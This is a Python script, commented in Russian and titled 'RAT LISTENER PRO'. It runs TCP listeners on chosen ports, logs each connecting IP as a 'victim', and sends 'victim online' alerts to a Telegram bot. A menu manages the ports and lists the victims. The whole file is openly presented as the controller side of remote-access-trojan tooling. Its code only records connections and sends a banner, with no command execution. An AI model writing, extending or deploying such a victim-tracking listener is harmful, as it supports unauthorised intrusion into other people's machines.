import os
import socket
import threading
import time
import requests
from datetime import datetime

# ================== НАСТРОЙКИ ==================
TELEGRAM_BOT_TOKEN = "ТОКЕН_БОТА"  # Вставь свой токен
TELEGRAM_CHAT_ID = "ЧАТ_ID"         # Вставь свой Chat ID
# ===============================================

ports = {}
connections = {}  # {port: [список IP жертв]}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_telegram_notification(message):
    """Отправка уведомления в Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        requests.post(url, data=data)
    except:
        pass

def start_port(port, name):
    def run_server():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(('0.0.0.0', port))
            server.listen(5)
            ports[port]["status"] = "🟢 ONLINE"
            ports[port]["link"] = f"rat://0.0.0.0:{port}"
            print(f"\n[+] Порт {port} открыт как '{name}'")
            print(f"[+] ССЫЛКА: {ports[port]['link']}")

            while ports[port]["status"] == "🟢 ONLINE":
                server.settimeout(2)
                try:
                    client, addr = server.accept()
                    ip = addr[0]
                    
                    # Сохраняем подключение
                    if port not in connections:
                        connections[port] = []
                    if ip not in connections[port]:
                        connections[port].append(ip)
                    
                    # Отправляем уведомление в Telegram
                    msg = f"🔥 ЖЕРТВА В СЕТИ!\nПорт: {port} ({name})\nIP: {ip}\nВремя: {datetime.now().strftime('%H:%M:%S')}"
                    send_telegram_notification(msg)
                    
                    # Выводим в консоль
                    print(f"\n[!] ЖЕРТВА В СЕТИ [{name}]")
                    print(f"    IP: {ip}")
                    print(f"    Время: {datetime.now().strftime('%H:%M:%S')}")
                    
                    client.send(f"RAT {name}\n".encode())
                    client.close()
                    
                except socket.timeout:
                    continue
                except:
                    break
        except Exception as e:
            ports[port]["status"] = f"🔴 ОШИБКА"
        finally:
            server.close()
            if port in ports:
                ports[port]["status"] = "🔴 OFFLINE"

    if port not in ports:
        ports[port] = {"name": name, "status": "🟡 ЗАПУСК...", "link": ""}
        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()
        time.sleep(1)
    else:
        print(f"Порт {port} уже существует.")

def stop_port(port):
    if port in ports:
        ports[port]["status"] = "🔴 OFFLINE"
        print(f"[-] Порт {port} закрыт.")
    else:
        print("Порт не найден.")

def show_victims():
    """Показать всех жертв в сети"""
    print("\n=== ЖЕРТВЫ В СЕТИ ===")
    if not connections:
        print("  Нет активных подключений.")
    else:
        for port, victims in connections.items():
            if port in ports:
                print(f"\n[{ports[port]['name']}] 0.0.0.0:{port} - {len(victims)} жертв(ы):")
                for victim in victims:
                    print(f"  👤 {victim}")

def show_menu():
    clear_screen()
    print("=== RAT LISTENER PRO ===\n")
    print("Активные порты:")
    if not ports:
        print("  Пусто. Создай первый порт.")
    else:
        for p, data in ports.items():
            victims_count = len(connections.get(p, []))
            victim_status = f"👤 {victims_count} жертв" if victims_count > 0 else ""
            print(f"  {data['status']} [{data['name']}] → 0.0.0.0:{p} {victim_status}")
    
    print("\nКоманды:")
    print("  1. Создать порт + хостинг")
    print("  2. Закрыть порт")
    print("  3. Показать всех жертв")
    print("  4. Обновить статусы")
    print("  0. Выход")

def main():
    print("🔔 Telegram Webhook:", "АКТИВЕН" if TELEGRAM_BOT_TOKEN != "ТОКЕН_БОТА" else "НЕ НАСТРОЕН")
    time.sleep(2)
    
    while True:
        show_menu()
        cmd = input("\nВыбери команду: ").strip()

        if cmd == "1":
            try:
                port = int(input("  Введи номер порта: "))
                name = input("  Введи имя для порта: ")
                start_port(port, name)
            except:
                print("  Ошибка ввода.")
            input("  Нажми Enter...")

        elif cmd == "2":
            try:
                port = int(input("  Введи номер порта для закрытия: "))
                stop_port(port)
            except:
                print("  Ошибка ввода.")
            input("  Нажми Enter...")

        elif cmd == "3":
            show_victims()
            input("\nНажми Enter...")

        elif cmd == "4":
            continue

        elif cmd == "0":
            print("Выход.")
            break

        else:
            print("Неверная команда.")
            input("Нажми Enter...")

if __name__ == "__main__":
    main()
